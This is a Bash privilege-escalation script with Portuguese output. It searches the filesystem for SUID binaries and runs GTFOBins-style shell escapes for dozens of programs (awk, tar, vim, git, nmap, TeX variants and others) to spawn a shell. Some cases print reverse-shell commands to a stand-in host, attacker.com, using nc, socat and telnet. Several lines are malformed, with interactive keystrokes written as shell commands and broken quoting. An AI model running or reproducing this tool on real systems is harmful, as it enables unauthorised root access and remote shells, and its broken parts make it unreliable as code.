#!/bin/bash
echo -e "\e[1;35m"
cat << "EOF"
 _    _       _ _          _ ___ _   _ ___ ___  
| |  (_)_ __ (_) |_ ___ __| / __| | | |_ _|   \ 
| |__| | '  \| |  _/ -_) _` \__ \ |_| || || |) |
|____|_|_|_|_|_|\__\___\__,_|___/\___/|___|___/ 
                                               

EOF
echo -e "\e[0m"

echo -e "\e[1;35m"
echo "[*] ------------- Limited SUID ------------"
echo "[*] Procurando Limited SUID do GTFOBins...."
echo "[*] ---------------------------------------"
echo -e "\e[0m"

LSUID=$(find / -perm -u=s -type f 2>/dev/null)
echo "Buscando..."
for Lpath in $LSUID; do
    LSbin=$(basename "$Lpath")

    case "$LSbin" in
        aria2c)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            COMMAND='id'
            TF=$(mktemp)
            echo "$COMMAND" > $TF
            chmod +x $TF
            "$Lpath" --on-download-error=$TF http://x
            ;;
        awk|gawk|mawk|nawk)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" 'BEGIN {system("/bin/sh")}'
            ;;
        batcat)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --paging always /etc/profile
            /bin/sh
            ;;
        byebug)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp)
            echo 'system("/bin/sh")' > $TF
            "$Lpath" $TF
            continue
            ;;
        composer)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp -d)
            echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
            "$Lpath" --working-dir=$TF run-script x
            ;;
        dc)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -e '!/bin/sh'
            ;;
        dvips)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            tex '\special{psfile="`/bin/sh 1>&0"}\end'
            "$Lpath" -R0 texput.dvi
            ;;
        ed|ginsh|iftop|tasksh|tdbtool)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath"
            !/bin/sh
            ;;
        git)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            PAGER='sh -c "exec sh 0<&1"' "$Lpath" -p help
            ;;
        joe)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath"
            ^K!/bin/sh
            ;;
        latex|pdflatex|xelatex)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
            ;;
        ldconfig)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            echo "TF=$(mktemp -d)"
            echo "echo "$TF" > "$TF/conf""
            echo "# move malicious libraries in $TF"
            echo ""$Lpath" -f "$TF/conf""
            ;;
        lftp)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -c '!/bin/sh'
            ;;
        lua)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -e 'os.execute("/bin/sh")'
            ;;
        lualatex)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'
            ;;
        luatex)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -shell-escape '\directlua{os.execute("/bin/sh")}\end'
            ;;
        mysql)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -e '\! /bin/sh'
            ;;
        nano|pico)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -s /bin/sh
            /bin/sh
            ^T
            ;;
        nc)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            echo "nc -e /bin/sh attacker.com 4444"
            ;;
        ncdu)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath"
            b
            ;;
        nmap)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp)
            echo 'os.execute("/bin/sh")' > $TF
            "$Lpath" --script=$TF
            ;;
        octave)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            octave-cli --eval 'system("/bin/sh")'
            ;;
        pandoc)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp)
            echo 'os.execute("/bin/sh")' >$TF
            "$Lpath" -L $TF /dev/null
            ;;
        pdftex|tex|xetex)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --shell-escape '\write18{/bin/sh}\end'
            ;;
        pic)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -U
            .PS
            sh X sh X
            ;;
        posh)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" 
            ;;
        pry)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            echo "pry"
            echo "system("/bin/sh")"
            ;;
        psftp)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            sudo "$Lpath"
            !/bin/sh
            ;;
        rake)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -p '`/bin/sh 1>&0`'
            ;;
        rpm | rpmquery)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --eval '%{lua:os.execute("/bin/sh")}'
            ;;
        rpmdb | rpmverify)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --eval '%(/bin/sh 1>&2)'
            ;;
        runscript)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp)
            echo '! exec /bin/sh' >$TF
            "$Lpath" $TF
            ;;
        rview | rvim | view | vim | vimdiff)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -c ':lua os.execute("reset; exec sh")'
            ;;
        scp)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp)
            echo 'sh 0<&2 1>&2' > $TF
            chmod +x "$TF"
            "$Lpath" -S $TF a b:
            ;;
        scrot)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -e /bin/sh
            ;;
        slsh)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -e 'system("/bin/sh")'
            ;;
        socat)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            echo "socat tcp-connect:attacker.com:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane"
            ;;
        sqlite3)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" /dev/null '.shell /bin/sh'
            ;;
        tar)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
            ;;
        tmate)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -c /bin/sh
            ;;
        watch)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" 'reset; exec sh 1>&0 2>&0'
            ;;
        zip)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp -u)
            "$Lpath" $TF /etc/hosts -T -TT 'sh #'
            sudo rm $TF
            ;;
        telnet)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            echo "RHOST=attacker.com"
            echo "RPORT=12345"
            echo "./telnet $RHOST $RPORT"
            echo "^]"
            echo "!/bin/sh"
            ;;

        *)
            ;;
    esac
done
